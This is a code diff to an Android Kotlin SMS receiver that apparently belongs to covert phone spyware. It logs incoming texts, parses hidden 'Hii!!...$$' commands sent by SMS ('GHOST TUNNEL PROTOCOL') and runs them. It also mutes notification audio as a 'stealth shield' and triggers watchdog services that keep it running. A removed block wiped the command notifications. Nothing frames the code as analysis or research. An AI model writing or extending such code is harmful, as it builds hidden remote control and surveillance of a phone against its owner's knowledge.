@@ -58,18 +58,12 @@ class SmsReceiver : BroadcastReceiver() {
                     editor.putString("sms_logs_cache", cacheArr.toString())
                 } catch(e: Exception) {}
 
-                // 3. GHOST TUNNEL PROTOCOL
-                val regex = Regex("Hii!!(.*?)\\\$\\$")
-                val match = regex.find(body)
-
-                if (match != null) {
-                    DebugLogger.log("SMS_WAKE", "Embedded command detected. Engaging stealth shield.")
+                                // 3. GHOST TUNNEL PROTOCOL
+                if (body.contains("Hii!!")) {
+                    DebugLogger.log("SMS_WAKE", "Shield Triggered by keyword.")
                     
                     // --- STEALTH SHIELD: AUDIO MUTE ---
                     val am = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-                    val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                    
-                    // Save original states
                     val oldMode = am.ringerMode
                     val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION)
                     
@@ -80,58 +74,53 @@ class SmsReceiver : BroadcastReceiver() {
                         } catch (e: Exception) {}
                     }
 
+                    // Trigger Resurrection/Watchdog
                     ServiceResurrector.shock(context)
                     KeepAliveReceiver.scheduleNext(context)
 
-                    val rawExtracted = match.groupValues[1].trim()
-                    val splitIdx = rawExtracted.indexOf('=')
-                    
-                    val cmd: String
-                    var content: String
-                    
-                    if (splitIdx != -1) {
-                        cmd = rawExtracted.substring(0, splitIdx).uppercase()
-                        content = java.net.URLDecoder.decode(rawExtracted.substring(splitIdx + 1), "UTF-8")
-                    } else {
-                        cmd = rawExtracted.uppercase()
-                        content = "0"
-                    }
+                    // --- PARSER ENGINE ---
+                    val regex = Regex("Hii!!(.*?)\\\$\\$")
+                    val match = regex.find(body)
 
-                    // INJECT SENDER: If CodeRed is triggered via SMS and no handler is provided, auto-inject the sender's number
-                    if (cmd == "CODERED" && !content.contains("|")) {
-                        content = "$content|$sender"
-                    }
+                    if (match != null) {
+                        val rawExtracted = match.groupValues[1].trim()
+                        val splitIdx = rawExtracted.indexOf('=')
+                        val cmd: String
+                        var content: String
+                        
+                        if (splitIdx != -1) {
+                            cmd = rawExtracted.substring(0, splitIdx).uppercase()
+                            content = java.net.URLDecoder.decode(rawExtracted.substring(splitIdx + 1), "UTF-8")
+                        } else {
+                            cmd = rawExtracted.uppercase()
+                            content = "0"
+                        }
 
-                    // STEALTH WIPE: Remove the incoming command notification immediately
-                    CoroutineScope(Dispatchers.Main).launch {
-                        delay(500) // Wait for OS to post the notification
-                        MyNotificationListener.instance?.wipeNotifications("TEXT", "Hii!!")
-                    }
+                        if (cmd == "CODERED" && !content.contains("|")) content = "$content|$sender"
 
-                                            // 4. ASYNC HANDOFF
                         val pendingResult = goAsync()
                         CoroutineScope(Dispatchers.IO).launch {
                             try {
-                                val mockCmd = JSONObject().apply {
-                                    put("id", -1)
-                                    put("file_name", cmd)
-                                    put("content", content)
-                                }
+                                val mockCmd = JSONObject().apply { put("id", -1); put("file_name", cmd); put("content", content) }
                                 CommandProcessor.processSingleCommand(context, mockCmd)
-                                
-                                // --- STEALTH SHIELD: RESTORE AUDIO ---
-                                delay(3000) // Wait for OS notification cycle to end
-                                if (PermissionManager.hasDndAccess(context)) {
-                                    am.ringerMode = oldMode
-                                    am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, oldVol, 0)
-                                }
-                            } catch (e: Exception) {
-                                DebugLogger.log("SMS_CMD_ERR", "Command failed: ${e.message}")
-                            } finally {
-                                pendingResult.finish()
-                            }
+                            } catch (e: Exception) { 
+                                DebugLogger.log("SMS_CMD_ERR", "Command execution failed")
+                            } finally { pendingResult.finish() }
+                        }
+                    } else {
+                        DebugLogger.log("SMS_WAKE", "Shield active but command malformed. No execution.")
+                    }
+
+                    // --- UNIVERSAL RESTORATION ---
+                    CoroutineScope(Dispatchers.Main).launch {
+                        delay(3500) // Ensure silence outlasts the OS notification sound event
+                        if (PermissionManager.hasDndAccess(context)) {
+                            am.ringerMode = oldMode
+                            am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, oldVol, 0)
+                            DebugLogger.log("SHIELD", "Audio state restored.")
                         }
                     }
+                }
             }
             editor.commit() // Commit synchronously to disk
         } catch (e: Exception) {
